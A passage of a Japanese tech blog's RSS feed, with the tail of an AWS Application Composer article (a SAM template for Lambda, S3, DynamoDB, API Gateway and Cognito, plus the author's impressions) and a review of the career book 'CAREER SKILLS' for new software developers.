class="attr">BUCKET_NAME:</span> <span class="type">!Ref</span> <span class="string">fugaFileBucket</span></span><br><span class="line">          <span class="attr">BUCKET_ARN:</span> <span class="type">!GetAtt</span> <span class="string">fugaFileBucket.Arn</span></span><br><span class="line">          <span class="attr">TABLE_NAME:</span> <span class="type">!Ref</span> <span class="string">hogeTable</span></span><br><span class="line">          <span class="attr">TABLE_ARN:</span> <span class="type">!GetAtt</span> <span class="string">hogeTable.Arn</span></span><br><span class="line">      <span class="attr">Policies:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">Statement:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">Effect:</span> <span class="string">Allow</span></span><br><span class="line">              <span class="attr">Action:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:GetObject</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:GetObjectAcl</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:GetObjectLegalHold</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:GetObjectRetention</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:GetObjectTorrent</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:GetObjectVersion</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:GetObjectVersionAcl</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:GetObjectVersionForReplication</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:GetObjectVersionTorrent</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:ListBucket</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:ListBucketMultipartUploads</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:ListBucketVersions</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:ListMultipartUploadParts</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:AbortMultipartUpload</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:DeleteObject</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:DeleteObjectVersion</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:PutObject</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:PutObjectLegalHold</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:PutObjectRetention</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:RestoreObject</span></span><br><span class="line">              <span class="attr">Resource:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="type">!Sub</span> <span class="string">arn:$&#123;AWS::Partition&#125;:s3:::$&#123;fugaFileBucket&#125;</span></span><br><span class="line">                <span class="bullet">-</span> <span class="type">!Sub</span> <span class="string">arn:$&#123;AWS::Partition&#125;:s3:::$&#123;fugaFileBucket&#125;/*</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">DynamoDBCrudPolicy:</span></span><br><span class="line">            <span class="attr">TableName:</span> <span class="type">!Ref</span> <span class="string">hogeTable</span></span><br><span class="line">  <span class="attr">uploadFugaFileLogGroup:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">AWS::Logs::LogGroup</span></span><br><span class="line">    <span class="attr">DeletionPolicy:</span> <span class="string">Retain</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">LogGroupName:</span> <span class="type">!Sub</span> <span class="string">/aws/lambda/$&#123;uploadFugaFile&#125;</span></span><br><span class="line">  <span class="attr">getTemplate:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">AWS::Serverless::Function</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">Description:</span> <span class="type">!Sub</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">Stack</span> <span class="string">$&#123;AWS::StackName&#125;</span> <span class="string">Function</span> <span class="string">$&#123;ResourceName&#125;</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">ResourceName:</span> <span class="string">getTemplate</span></span><br><span class="line">      <span class="attr">CodeUri:</span> <span class="string">src/Function3</span></span><br><span class="line">      <span class="attr">Handler:</span> <span class="string">index.handler</span></span><br><span class="line">      <span class="attr">Runtime:</span> <span class="string">nodejs18.x</span></span><br><span class="line">      <span class="attr">MemorySize:</span> <span class="number">3008</span></span><br><span class="line">      <span class="attr">Timeout:</span> <span class="number">30</span></span><br><span class="line">      <span class="attr">Tracing:</span> <span class="string">Active</span></span><br><span class="line">      <span class="attr">Events:</span></span><br><span class="line">        <span class="attr">awesomeApiGET:</span></span><br><span class="line">          <span class="attr">Type:</span> <span class="string">Api</span></span><br><span class="line">          <span class="attr">Properties:</span></span><br><span class="line">            <span class="attr">Path:</span> <span class="string">/*</span></span><br><span class="line">            <span class="attr">Method:</span> <span class="string">GET</span></span><br><span class="line">            <span class="attr">RestApiId:</span> <span class="type">!Ref</span> <span class="string">awesomeApi</span></span><br><span class="line">      <span class="attr">Environment:</span></span><br><span class="line">        <span class="attr">Variables:</span></span><br><span class="line">          <span class="attr">BUCKET_NAME:</span> <span class="type">!Ref</span> <span class="string">templateBucket</span></span><br><span class="line">          <span class="attr">BUCKET_ARN:</span> <span class="type">!GetAtt</span> <span class="string">templateBucket.Arn</span></span><br><span class="line">      <span class="attr">Policies:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">Statement:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">Effect:</span> <span class="string">Allow</span></span><br><span class="line">              <span class="attr">Action:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:GetObject</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:GetObjectAcl</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:GetObjectLegalHold</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:GetObjectRetention</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:GetObjectTorrent</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:GetObjectVersion</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:GetObjectVersionAcl</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:GetObjectVersionForReplication</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:GetObjectVersionTorrent</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:ListBucket</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:ListBucketMultipartUploads</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:ListBucketVersions</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:ListMultipartUploadParts</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:AbortMultipartUpload</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:DeleteObject</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:DeleteObjectVersion</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:PutObject</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:PutObjectLegalHold</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:PutObjectRetention</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">s3:RestoreObject</span></span><br><span class="line">              <span class="attr">Resource:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="type">!Sub</span> <span class="string">arn:$&#123;AWS::Partition&#125;:s3:::$&#123;templateBucket&#125;</span></span><br><span class="line">                <span class="bullet">-</span> <span class="type">!Sub</span> <span class="string">arn:$&#123;AWS::Partition&#125;:s3:::$&#123;templateBucket&#125;/*</span></span><br><span class="line">  <span class="attr">getTemplateLogGroup:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">AWS::Logs::LogGroup</span></span><br><span class="line">    <span class="attr">DeletionPolicy:</span> <span class="string">Retain</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">LogGroupName:</span> <span class="type">!Sub</span> <span class="string">/aws/lambda/$&#123;getTemplate&#125;</span></span><br><span class="line">  <span class="attr">hogeTable:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">AWS::DynamoDB::Table</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">AttributeDefinitions:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">AttributeName:</span> <span class="string">id</span></span><br><span class="line">          <span class="attr">AttributeType:</span> <span class="string">S</span></span><br><span class="line">      <span class="attr">BillingMode:</span> <span class="string">PAY_PER_REQUEST</span></span><br><span class="line">      <span class="attr">KeySchema:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">AttributeName:</span> <span class="string">id</span></span><br><span class="line">          <span class="attr">KeyType:</span> <span class="string">HASH</span></span><br><span class="line">      <span class="attr">StreamSpecification:</span></span><br><span class="line">        <span class="attr">StreamViewType:</span> <span class="string">NEW_AND_OLD_IMAGES</span></span><br><span class="line">  <span class="attr">insertHoge:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">AWS::Serverless::Function</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">Description:</span> <span class="type">!Sub</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">Stack</span> <span class="string">$&#123;AWS::StackName&#125;</span> <span class="string">Function</span> <span class="string">$&#123;ResourceName&#125;</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">ResourceName:</span> <span class="string">insertHoge</span></span><br><span class="line">      <span class="attr">CodeUri:</span> <span class="string">src/Function</span></span><br><span class="line">      <span class="attr">Handler:</span> <span class="string">index.handler</span></span><br><span class="line">      <span class="attr">Runtime:</span> <span class="string">nodejs18.x</span></span><br><span class="line">      <span class="attr">MemorySize:</span> <span class="number">3008</span></span><br><span class="line">      <span class="attr">Timeout:</span> <span class="number">30</span></span><br><span class="line">      <span class="attr">Tracing:</span> <span class="string">Active</span></span><br><span class="line">      <span class="attr">Events:</span></span><br><span class="line">        <span class="attr">awesomeApiPOSTapihogesinsert:</span></span><br><span class="line">          <span class="attr">Type:</span> <span class="string">Api</span></span><br><span class="line">          <span class="attr">Properties:</span></span><br><span class="line">            <span class="attr">Path:</span> <span class="string">/api/hoges/insert</span></span><br><span class="line">            <span class="attr">Method:</span> <span class="string">POST</span></span><br><span class="line">            <span class="attr">RestApiId:</span> <span class="type">!Ref</span> <span class="string">awesomeApi</span></span><br><span class="line">      <span class="attr">Environment:</span></span><br><span class="line">        <span class="attr">Variables:</span></span><br><span class="line">          <span class="attr">TABLE_NAME:</span> <span class="type">!Ref</span> <span class="string">hogeTable</span></span><br><span class="line">          <span class="attr">TABLE_ARN:</span> <span class="type">!GetAtt</span> <span class="string">hogeTable.Arn</span></span><br><span class="line">      <span class="attr">Policies:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">DynamoDBCrudPolicy:</span></span><br><span class="line">            <span class="attr">TableName:</span> <span class="type">!Ref</span> <span class="string">hogeTable</span></span><br><span class="line">  <span class="attr">insertHogeLogGroup:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">AWS::Logs::LogGroup</span></span><br><span class="line">    <span class="attr">DeletionPolicy:</span> <span class="string">Retain</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">LogGroupName:</span> <span class="type">!Sub</span> <span class="string">/aws/lambda/$&#123;insertHoge&#125;</span></span><br><span class="line">  <span class="attr">fugaFileBucket:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">AWS::S3::Bucket</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">BucketName:</span> <span class="type">!Sub</span> <span class="string">$&#123;AWS::StackName&#125;-fugafileb-$&#123;AWS::AccountId&#125;</span></span><br><span class="line">      <span class="attr">BucketEncryption:</span></span><br><span class="line">        <span class="attr">ServerSideEncryptionConfiguration:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">ServerSideEncryptionByDefault:</span></span><br><span class="line">              <span class="attr">SSEAlgorithm:</span> <span class="string">aws:kms</span></span><br><span class="line">              <span class="attr">KMSMasterKeyID:</span> <span class="string">alias/aws/s3</span></span><br><span class="line">      <span class="attr">PublicAccessBlockConfiguration:</span></span><br><span class="line">        <span class="attr">IgnorePublicAcls:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">RestrictPublicBuckets:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">fugaFileBucketBucketPolicy:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">AWS::S3::BucketPolicy</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">Bucket:</span> <span class="type">!Ref</span> <span class="string">fugaFileBucket</span></span><br><span class="line">      <span class="attr">PolicyDocument:</span></span><br><span class="line">        <span class="attr">Id:</span> <span class="string">RequireEncryptionInTransit</span></span><br><span class="line">        <span class="attr">Version:</span> <span class="string">&#x27;2012-10-17&#x27;</span></span><br><span class="line">        <span class="attr">Statement:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">Principal:</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">            <span class="attr">Action:</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">            <span class="attr">Effect:</span> <span class="string">Deny</span></span><br><span class="line">            <span class="attr">Resource:</span></span><br><span class="line">              <span class="bullet">-</span> <span class="type">!GetAtt</span> <span class="string">fugaFileBucket.Arn</span></span><br><span class="line">              <span class="bullet">-</span> <span class="type">!Sub</span> <span class="string">$&#123;fugaFileBucket.Arn&#125;/*</span></span><br><span class="line">            <span class="attr">Condition:</span></span><br><span class="line">              <span class="attr">Bool:</span></span><br><span class="line">                <span class="attr">aws:SecureTransport:</span> <span class="string">&#x27;false&#x27;</span></span><br><span class="line">  <span class="attr">templateBucket:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">AWS::S3::Bucket</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">BucketName:</span> <span class="type">!Sub</span> <span class="string">$&#123;AWS::StackName&#125;-templateb-$&#123;AWS::AccountId&#125;</span></span><br><span class="line">      <span class="attr">BucketEncryption:</span></span><br><span class="line">        <span class="attr">ServerSideEncryptionConfiguration:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">ServerSideEncryptionByDefault:</span></span><br><span class="line">              <span class="attr">SSEAlgorithm:</span> <span class="string">aws:kms</span></span><br><span class="line">              <span class="attr">KMSMasterKeyID:</span> <span class="string">alias/aws/s3</span></span><br><span class="line">      <span class="attr">PublicAccessBlockConfiguration:</span></span><br><span class="line">        <span class="attr">IgnorePublicAcls:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">RestrictPublicBuckets:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">templateBucketBucketPolicy:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">AWS::S3::BucketPolicy</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">Bucket:</span> <span class="type">!Ref</span> <span class="string">templateBucket</span></span><br><span class="line">      <span class="attr">PolicyDocument:</span></span><br><span class="line">        <span class="attr">Id:</span> <span class="string">RequireEncryptionInTransit</span></span><br><span class="line">        <span class="attr">Version:</span> <span class="string">&#x27;2012-10-17&#x27;</span></span><br><span class="line">        <span class="attr">Statement:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">Principal:</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">            <span class="attr">Action:</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">            <span class="attr">Effect:</span> <span class="string">Deny</span></span><br><span class="line">            <span class="attr">Resource:</span></span><br><span class="line">              <span class="bullet">-</span> <span class="type">!GetAtt</span> <span class="string">templateBucket.Arn</span></span><br><span class="line">              <span class="bullet">-</span> <span class="type">!Sub</span> <span class="string">$&#123;templateBucket.Arn&#125;/*</span></span><br><span class="line">            <span class="attr">Condition:</span></span><br><span class="line">              <span class="attr">Bool:</span></span><br><span class="line">                <span class="attr">aws:SecureTransport:</span> <span class="string">&#x27;false&#x27;</span></span><br><span class="line">  <span class="attr">awesomeApi:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">AWS::Serverless::Api</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">Name:</span> <span class="type">!Sub</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">$&#123;ResourceName&#125;</span> <span class="string">From</span> <span class="string">Stack</span> <span class="string">$&#123;AWS::StackName&#125;</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">ResourceName:</span> <span class="string">awesomeApi</span></span><br><span class="line">      <span class="attr">StageName:</span> <span class="string">Prod</span></span><br><span class="line">      <span class="attr">DefinitionBody:</span></span><br><span class="line">        <span class="attr">openapi:</span> <span class="string">&#x27;3.0&#x27;</span></span><br><span class="line">        <span class="attr">info:</span> &#123;&#125;</span><br><span class="line">        <span class="attr">paths:</span></span><br><span class="line">          <span class="string">/api/hoges/insert:</span></span><br><span class="line">            <span class="attr">post:</span></span><br><span class="line">              <span class="attr">x-amazon-apigateway-integration:</span></span><br><span class="line">                <span class="attr">httpMethod:</span> <span class="string">POST</span></span><br><span class="line">                <span class="attr">type:</span> <span class="string">aws_proxy</span></span><br><span class="line">                <span class="attr">uri:</span> <span class="type">!Sub</span> <span class="string">arn:$&#123;AWS::Partition&#125;:apigateway:$&#123;AWS::Region&#125;:lambda:path/2015-03-31/functions/$&#123;insertHoge.Arn&#125;/invocations</span></span><br><span class="line">              <span class="attr">responses:</span> &#123;&#125;</span><br><span class="line">          <span class="string">/api/fugas/upload:</span></span><br><span class="line">            <span class="attr">post:</span></span><br><span class="line">              <span class="attr">x-amazon-apigateway-integration:</span></span><br><span class="line">                <span class="attr">httpMethod:</span> <span class="string">POST</span></span><br><span class="line">                <span class="attr">type:</span> <span class="string">aws_proxy</span></span><br><span class="line">                <span class="attr">uri:</span> <span class="type">!Sub</span> <span class="string">arn:$&#123;AWS::Partition&#125;:apigateway:$&#123;AWS::Region&#125;:lambda:path/2015-03-31/functions/$&#123;uploadFugaFile.Arn&#125;/invocations</span></span><br><span class="line">              <span class="attr">responses:</span> &#123;&#125;</span><br><span class="line">          <span class="string">/*:</span></span><br><span class="line">            <span class="attr">get:</span></span><br><span class="line">              <span class="attr">x-amazon-apigateway-integration:</span></span><br><span class="line">                <span class="attr">httpMethod:</span> <span class="string">POST</span></span><br><span class="line">                <span class="attr">type:</span> <span class="string">aws_proxy</span></span><br><span class="line">                <span class="attr">uri:</span> <span class="type">!Sub</span> <span class="string">arn:$&#123;AWS::Partition&#125;:apigateway:$&#123;AWS::Region&#125;:lambda:path/2015-03-31/functions/$&#123;getTemplate.Arn&#125;/invocations</span></span><br><span class="line">              <span class="attr">responses:</span> &#123;&#125;</span><br><span class="line">      <span class="attr">EndpointConfiguration:</span> <span class="string">REGIONAL</span></span><br><span class="line">      <span class="attr">TracingEnabled:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">Auth:</span></span><br><span class="line">        <span class="attr">Authorizers:</span></span><br><span class="line">          <span class="attr">awesomeAuthorizer:</span></span><br><span class="line">            <span class="attr">UserPoolArn:</span> <span class="type">!GetAtt</span> <span class="string">awesomeUserPool.Arn</span></span><br><span class="line">  <span class="attr">awesomeUserPool:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">AWS::Cognito::UserPool</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">AdminCreateUserConfig:</span></span><br><span class="line">        <span class="attr">AllowAdminCreateUserOnly:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">AliasAttributes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">email</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">preferred_username</span></span><br><span class="line">      <span class="attr">UserPoolName:</span> <span class="type">!Sub</span> <span class="string">$&#123;AWS::StackName&#125;-awesomeUserPool</span></span><br></pre></td></tr></table></figure></div></details><h4 id="やってみた感想"><a href="#やってみた感想" class="headerlink" title="やってみた感想"></a>やってみた感想</h4><p>とにかくお手軽なことに驚きました。上述の <strong>やってみた</strong> はスクリーンショットを撮る時間を除けば5分も掛からなかったため、タイポに苦しみながら手書きするのと比べると雲泥の差を感じました。また、環境構築が不要＋GUIだけで完結できるため、今後思い立った時にサクッと作れちゃうなと引き出しを増やすことが出来ました。</p><p>一方で、上述の構成に例えばCloudFrontを追加したいと思った時にApplication Composerだけではできないため、やはり”型にハマれば強い”系のサービスではあるなと思いました。</p><h2 id="おわりに"><a href="#おわりに" class="headerlink" title="おわりに"></a>おわりに</h2><p>最後まで読んでいただきありがとうございました。</p><p>今後も新しめの情報に目を光らせ、興味が沸いたらまた記事にしようと思います。</p><p>では、Futureの春の入門祭りはまだまだ続きますということで、次回担当の 高世駿 さんの <a href="/articles/20230510a/">正規表現入門</a> です。</p>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/Infrastructure/">Infrastructure</category>
      
      
      <category domain="https://future-architect.github.io/tags/AWS/">AWS</category>
      
      <category domain="https://future-architect.github.io/tags/%E3%83%8E%E3%83%BC%E3%82%B3%E3%83%BC%E3%83%89/">ノーコード</category>
      
      <category domain="https://future-architect.github.io/tags/ApplicationComposer/">ApplicationComposer</category>
      
      
      <comments>https://future-architect.github.io/articles/20230509a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>新人の時に出会いたかった本の紹介</title>
      <link>https://future-architect.github.io/articles/20230508b/</link>
      <guid>https://future-architect.github.io/articles/20230508b/</guid>
      <pubDate>Sun, 07 May 2023 15:00:01 GMT</pubDate>
      
        
        
          
          
      <description>&lt;img src=&quot;/images/20230508b/P55740_common_pc.jpg&quot; alt=&quot;&quot; width=&quot;426&quot; height=&quot;600&quot;&gt;

&lt;h2 id=&quot;はじめに&quot;&gt;&lt;a href=&quot;#はじめに&quot; class=&quot;headerlink&quot;</description>
          
        
      
      
      
      <content:encoded><![CDATA[<img src="/images/20230508b/P55740_common_pc.jpg" alt="" width="426" height="600"><h2 id="はじめに"><a href="#はじめに" class="headerlink" title="はじめに"></a>はじめに</h2><p>齊藤です。よろしくお願いします。<a href="/articles/20230417a">春の入門連載2023</a>の12日目です。</p><p>まず、私が新人の時に出会いたかった本というのは、<a href="https://bookplus.nikkei.com/atcl/catalog/18/P55740/">CAREER SKILLS ソフトウェア開発者の完全キャリアガイド</a>です。</p><p>本書は著者がソフトウェア開発者としての第1歩の踏み出し方、成長やキャリアの伸ばし方についての本がなく、著者のYouTubeチャンネルでの質問が絶えないことから、必要と感じ執筆した本とのことです。</p><p>本の見出しとは別に、さらに メタ（高次）的 な分類があり、読者を3つのキャリアステージに割り当て読むべき部分をまとめています。</p><ul><li><strong>初心者、またはソフトウェア開発について学ぶことに興味を感じ始めたばかりの人</strong><blockquote><p>ソフトウェア開発&#x2F;プログラミングをこれから学びたいと思っていたり、少し勉強したことがあったりするものの、まだプロとしてソフトウェア開発をしたことがない人なら、ソフトウェア開発者として第一歩を踏み出す方法と最初の就職先を手に入れる方法を説明した第1部「ソフトウェア開発者になる方法」と第2部「就職する方法」がもっとも役に立つだろう。</p></blockquote></li><li><strong>キャリア形成中の開発者</strong><blockquote><p>あなたにとってもっとも役に立つのは、第3部「ソフトウェア開発の必須知識」だろう。この第3部には、あなたの知識のなかにあるかもしれない穴を埋め、自分の手でキャリアを管理して職場で成功を収めるために役に立つことが書かれている。</p></blockquote></li><li><strong>経験を積んだプロフェッショナル</strong><blockquote><p>さらに、あなたはほかの開発者のメンターになっていたりはしないだろうか？スタートの切り方について彼らにアドバイスすべきことが書いてあれば便利ではないだろうか？</p></blockquote></li></ul><p>「春の入門祭り」の通り、今年から晴れてソフトウェア開発者としてのキャリアをスタートした <strong>初心者、またはソフトウェア開発について学ぶことに興味を感じ始めたばかりの人</strong> に向け、 <strong>第1部「ソフトウェア開発者になる方法」</strong> を現在の様々な動向に合わせて紹介し、少しでもスタートダッシュを決められるように、また、偶然目にとまった <strong>キャリア形成中の開発者</strong> 、 <strong>経験を積んだプロフェッショナル</strong> の方々には <strong>スタートの切り方について彼らにアドバイスすべきこと</strong> のショートカットとして引用しスタートダッシュをアシストしていただければと思います。</p><h2 id="目次"><a href="#目次" class="headerlink" title="目次"></a>目次</h2><p>初心者、またはソフトウェア開発について学ぶことに興味を感じ始めたばかりの人 を対象とした章は以下の通りです。</p><ul><li>第2章 スタートの切り方</li><li>第3章 身につけないといけない技術スキル</li><li>第4章 技術スキルの身につけ方</li><li>第5章 どのプログラミング言語を学ぶべきか</li><li>第6章 最初のプログラミング言語の学び方</li><li>第7章 大学の活用</li><li>第8章 コーディングブートキャンプ</li><li>第9章 独学</li></ul><p>※第0章、第1章は、導入になります。</p><h3 id="第2章-スタートの切り方"><a href="#第2章-スタートの切り方" class="headerlink" title="第2章 スタートの切り方"></a>第2章 スタートの切り方</h3><p>ここでは、ソフトウェア開発とはどんな仕事かが記載されています。</p><p>コーディングは行うが、他にどんなことを仕事として行うか？大きくは、問題の理解を行い、設計、コーディング、テストとデプロイなどの作業があり、どの部分を仕事にしていくか、どのようなソフトウェア（ゲーム？BtoC？基幹システム？）を仕事にしていくか……</p><p>まずは、自分がどんなソフトウェア開発者になりたいかプランを立てることが必要となるということです。ここは、職場の先輩や上司との1on1などでプランニングしていけるかと思います。</p><h3 id="第3章-身につけないといけない技術スキル"><a href="#第3章-身につけないといけない技術スキル" class="headerlink" title="第3章 身につけないといけない技術スキル"></a>第3章 身につけないといけない技術スキル</h3><p>プログラミング言語は1つを深く学ぶ方が良く、種類よりも<strong>明瞭でわかりやすいコードの書き方</strong>を身につけることが大事であるとのことです。理由は、後半で出てきますが業務ではコードを書くよりも読む時間のほうが多く、デバックに多くの時間を使います。読みやすいコードは自分自身が読む際の助けになり、また、同僚や上司から評価されることにも繋がります。</p><p>テックブログ内では、以下の記事を見て勉強してもらえるとより良いと思います。</p><ul><li><a href="/articles/20211007a/">Java17対応版！Javaコーディング規約の紹介</a></li><li><a href="/articles/20190610/">ソースコードを綺麗にするためにまず心がけたい３点</a></li></ul><p>他に書籍内では、オブジェクト指向、アルゴリズム、OSや開発プラットフォーム、フレームワーク、データベース、バージョン管理ツール、ビルド&#x2F;デプロイ&#x2F;テスト&#x2F;デバック、と続きます。</p><p>個人的にはフレームワークの学習は大事です！情報系の大学に通っていたのですが、Microsoftに全振りでした。スタックとしては、Windows Server + C# + ASP.NET(まだ息してるかな……) + Visual Studio。会社に入ってからは、Linux(RHEL) + Java + Struts1&amp;Springの合体オレオレFW + Eclipse。フレームワークの知識もライブラリーの知識もカスリもせず、概念レベルで学び直しが必要でした。(C#とJavaが似ていたのが救い……)。流行りを追うのは大事です。</p><p>アルゴリズムについては、TopCoderがおすすめされていましたが、日本では<a href="https://atcoder.jp/?lang=ja">AtCoder</a>がおすすめです。自分は簡単な問題しかできないため、知り合いに「ログインボーナスやってるの？」と揶揄されました(笑) デイリーミッション感覚で続けてます。</p><p>バージョン管理ツールについては、タイムリーな記事がありますね！ <a href="/articles/20230428a/">初心者による初心者のための Git 入門</a></p><h3 id="第4章-技術スキルの身につけ方"><a href="#第4章-技術スキルの身につけ方" class="headerlink" title="第4章 技術スキルの身につけ方"></a>第4章 技術スキルの身につけ方</h3><p>１冊の本で学ぶのではなく、複数の本からブログ、ポッドキャスト、チュートリアルなどを見てそれらを組み合わせ、学習プランを立てるのが良いとのことです。複数見ることで共通箇所から重要な部分や学ぶ順序を知ることができるので効率よく学習を進められる。そして、突き詰めるよりも、手を動かし好奇心に任せて学習を進めていくとよいでしょう。</p><p>Twitterなどで有名な方を追っかけているといろいろおすすめされていますし、My new gear している人も多いのでハイテクグッズ好きはハマるかも。</p><h3 id="第5章-どのプログラミング言語を学ぶべきか"><a href="#第5章-どのプログラミング言語を学ぶべきか" class="headerlink" title="第5章 どのプログラミング言語を学ぶべきか"></a>第5章 どのプログラミング言語を学ぶべきか</h3><blockquote><p>どの言語を選ぶかはあまり大きな問題ではない。<br>最初のプログラミング言語の学習は、いつもかならずもっとも難しい。</p></blockquote><p>プログラミング言語は、細部では異なるが共通する部分が多くあり、2つ目のプログラミング言語を修得するのは簡単になるため、どの言語を学ぶかに悩む必要はなく就職しやすさで選べば良いとのことです。就職している方は、所属企業で主に使っている言語を選べば間違いないと思われます。</p><blockquote><p>言語機能の知識よりもライブラリーやフレームワークを活用することの方が、はるかに重要だ。</p></blockquote><p>そして、昨今ではOSSの利活用が進められており、複数のライブラリーを組み合わせてシステムを作ることが増えています。プログラミング言語の完全なマスターに匹敵するスキルも増えているため、最初に学ぶ言語についてあまり悩むことはないとのことです。</p><p>繰り返します！フレームワーク大事！！</p><h3 id="第6章-最初のプログラミング言語の学び方"><a href="#第6章-最初のプログラミング言語の学び方" class="headerlink" title="第6章 最初のプログラミング言語の学び方"></a>第6章 最初のプログラミング言語の学び方</h3><p>流れとしては、以下のような感じです。</p><blockquote><p>まずは動いているアプリケーションを見てみる</p></blockquote><p>とりあえず、世間で人気のOSSを見つけて、その中のコードを読み理解できるところがあるか見てみる。おそらく、実際のコードを見てみることでよく使われる機能や書き方を知ることで、言語の全体像を掴んだり、後のチュートリアルや参考書を読む際にあまり使われない機能や表記法の学習の優先度を下げることができるメリットがあると思います。</p><blockquote><p>優れた教材や本を複数見つけてきて流し読みする</p></blockquote><p>ここでもあくまで、学ぶ対象の全体像を調べることに重きを置きます。未知の未知を取り除くようにしたい、と著者は言っており何が分からないか分かればGoogle検索すればいいよね、とのことです。</p><blockquote><p>言語機能とライブラリーの違いを学ぶ</p></blockquote><p>「第5章 